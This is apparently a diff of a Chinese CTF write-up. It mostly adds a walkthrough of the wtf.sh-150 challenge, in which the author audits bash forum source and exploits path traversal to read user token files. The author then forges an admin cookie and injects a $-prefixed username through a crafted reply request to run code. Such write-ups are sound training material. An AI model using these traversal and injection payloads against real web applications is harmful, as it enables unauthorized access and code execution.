@@ -14,7 +14,7 @@ adword里面题目很多，挑一些题目来记录
 
 ![](https://qqx.im/mdimage/adword/paper.png)
 
-随便点点之后，发现是一些网站。使用Burpsuite的**Send to Spiders**功能
+随便点点之后，发现是一些网站。对付这种，使用Burpsuite的**Send to Spiders**功能
 
 
 
@@ -22,7 +22,7 @@ adword里面题目很多，挑一些题目来记录
 
 可以看到有login.php和admin.php和robots.txt，访问robots.txt里面也是login.php和admin.php,所以分别访问login.php和admin.php
 
-看到登录框自然是想要SQL注入fuzz一波。提交admin'会报错
+看到**登录框**自然是想要SQL注入fuzz一波。提交admin'会**报错**
 
 > **Warning**:  SQLite3::query(): Unable to prepare statement: 1, near "fa27f6dc1fec7b2c54fd77ce7f0118fb2a3ab180": syntax error in **/var/www/html/login.php** on line **47**
 
@@ -139,7 +139,7 @@ highlight_file('login.php');
 
 > 3fab54a50e770d830c0416df817567662a9dc85c
 
-cmd5查不到，行吧，要去paper里找。那就写个爬虫脚本和解析pdf爆破密码的脚本
+cmd5查不到，行吧，要去paper里找。一个一个找和一个一个单词去试，这题可能明年才做得出来。那就写个爬虫脚本和解析pdf单词爆破密码的脚本
 
 爬虫脚本
 
@@ -305,7 +305,7 @@ def download_pdf(url):
         fd.write(r.content)
 ```
 
-这脚本写了挺久，主要是一开始想着用多线程做生成者和消费者队列，结果发现爬虫本身就是自销自产。然后用布隆过滤器去重，防止死循环。
+这脚本写了挺久，主要是一开始想着用多线程做生成者和消费者队列，结果发现爬虫本身就是自销自产。然后用布隆过滤器去重，防止爬虫死循环。
 
 最后就可以跑出密码
 
@@ -318,7 +318,191 @@ def download_pdf(url):
 
 
 
-\>\>continue on
+## wtf.sh-150
+
+访问题目界面，是个论坛
+
+![](https://qqx.im/mdimage/adword/wtf.png)
+
+探索了一下，有几个点
+
+> 1. 有注册 登录功能
+> 2. 有很多主题
+> 3. 主题可以回复
+> 4. 可以自己发布主题
+
+既然有注册等等，那就是试试，顺便试试有没有SQL注入。FUZZ了一下，没有SQL注入，admin用户存在，flag可能跟admin有关。
+
+对于有很多主题，那就是用Burpsuite的**Spider**看看有没有什么隐藏的东西。发现就是几个wtf模块，login post profile reply等。也没有试出什么信息。
+
+第一波信息收集没收集到什么意思，而且与普通网站文件后缀也不同，是wtf。
+
+回到题目首页，标题是
+
+> Welcome to the wtf.sh Forums!
+
+试着访问一下,发现显示出了wtf.sh的源码，审计一下
+
+可以关注的点有几个
+
+```bash
+1. source lib.sh # import stdlib
+
+2.	# include文件，如果是wtf文件 当成bash解析
+    function include_page {
+    # include_page <pathname>
+    local pathname=$1
+    local cmd=""
+    [[ "${pathname:(-4)}" = '.wtf' ]];
+    local can_execute=$?;
+    page_include_depth=$(($page_include_depth+1))
+    if [[ $page_include_depth -lt $max_page_include_depth ]]
+    then
+    local line;
+    while read -r line; do
+    # check if we're in a script line or not ($ at the beginning implies script line)
+    # also, our extension needs to be .wtf
+    [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
+    is_script=$?;
+
+    # execute the line.
+    if [[ $is_script = 0 ]]
+    then
+    cmd+=$'\n'"${line#"$"}";
+    else
+    if [[ -n $cmd ]]
+    then
+    eval "$cmd" || log "Error during execution of ${cmd}";
+    cmd=""
+    fi
+    echo $line
+    fi
+    done < ${pathname}
+    else
+    echo "<p>Max include depth exceeded!<p>"
+    fi
+    }
+3.  其它文件
+	cp -R css index.wtf lib.sh login.wtf logout.wtf new_post.wtf new_user.wtf post.wtf post_functions.sh posts profile.wtf reply.wtf spinup.sh user_functions.sh users users_lookup wtf.sh "${sandbox_dir}";
+```
+
+根据上面的东西，先把其它源码给下下来审计。
+
+```bash
+1.lib.sh
+	一些依赖函数
+2.spinup.sh
+	一些目录初始化的命令
+3.user_functions.sh
+	关于用户的一些操作，比如创建用户 登录等
+4.post_functions.sh
+	这里面有两个函数，一个是create_post,另一个是reply,根据函数名就可以猜得出功能
+```
+
+根据post_functions.sh里create_post的
+
+```bash
+local post_id=$(basename $(mktemp --directory posts/XXXXX));
+
+echo ${username} > "posts/${post_id}/1";
+echo ${title} >> "posts/${post_id}/1";
+echo ${text} >> "posts/${post_id}/1";
+```
+
+可以知道，post_id是一个在posts下面的一个目录，并且会将内容写入该目录下的1文件里，而且没有做任何目录限制，那么就可以目录穿越，同时根据/post.wtf?post=K8laH是获取论坛主题内容，就可以知道会造成任意目录下的文件读取。
+
+所以提交
+
+```
+http://111.198.29.45:44741/post.wtf?post=../
+```
+
+读取上一层的文件
+
+![](https://qqx.im/mdimage/adword/wtf2.png)
+
+内容过多，搜索一下flag关键字
+
+![](https://qqx.im/mdimage/adword/get_flag1.png)
+
+```bash
+$ if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]] 
+$ then $ get_flag1 $ fi $ fi 
+```
+
+可以得知，如果以admin登录，就会获得flag1。关于获得admin权限，第一就是获得密码，第二就是获得cookie。之前user_functions.sh里有关于用户的函数，返回去看看可知
+
+```bash
+# user files look like:
+# username
+# hashed_pass
+# token
+echo "${username}" > "users/${user_id}";
+echo "${hashed_pass}" >> "users/${user_id}";
+echo "${token}" >> "users/${user_id}";
+```
+
+会把hash_pass和token放入users/${user_id}，既然这样就可以直接读取
+
+```
+?post=../users
+```
+
+![](https://qqx.im/mdimage/adword/admin_token.png)
+
+密码破解不出，用修改cookie的方式
+
+```
+Cookie: USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
+```
+
+然后访问profile得到flag1
+
+![](https://qqx.im/mdimage/adword/admin_get_flag.png)
+
+读了一下其它文件，发现没有get_flag2，所以应该就是要执行命令了。
+
+结合wtf.sh的.wtf文件解析，就是要上传一个wtf文件。在post_funtions里reply提供了这个机会
+
+```bash
+function reply {
+local post_id=$1;
+local username=$2;
+local text=$3;
+local hashed=$(hash_username "${username}");
+
+curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
+next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
+next_file=(posts/${post_id}/${next_reply_id});
+echo "${username}" > "${next_file}";
+echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
+echo "${text}" >> "${next_file}";
+
+# add post this is in reply to to posts cache
+echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
+}
+```
+
+post_id是可控的，username text可控，
+
+所以先注册一个$get_flag2用户，这是wtf解析导致的，$开头会被解析成bash。
+
+然后抓包提交
+
+```
+// 这里的%20是空格，为了让echo "${username}" > posts/1.wtf /${next_reply_id}截断，这样我们的1.wtf就不会被当成文件夹，而是被当成文件，不存在也会被创建，然后写入
+// 之所以写入users_lookup是因为users_lookup文件夹下面没有建立.nolist .noread,而posts下面有，所以无法访问其下的wtf。
+POST /reply.wtf?post=../users_lookup/1.wtf%20
+xxx
+
+text=123456&submit=
+```
+
+然后访问users_lookup/1.wtf
+
+![](https://qqx.im/mdimage/adword/get_flag2.png)
+
+\>\>To be continue
 
 
 
